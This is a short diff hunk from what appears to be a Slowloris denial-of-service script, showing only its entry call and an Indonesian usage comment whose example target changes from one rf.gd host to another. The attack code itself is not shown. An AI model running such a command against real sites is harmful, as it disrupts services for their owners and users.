@@ -32,4 +32,4 @@ if __name__ == "__main__":
     main(sys.argv[1], int(sys.argv[2]))
 
 # Jalankan script dengan perintah:
-# python slowloris.py http://bssnri.rf.gd 80
+# python slowloris.py http://bssri.rf.gd 80
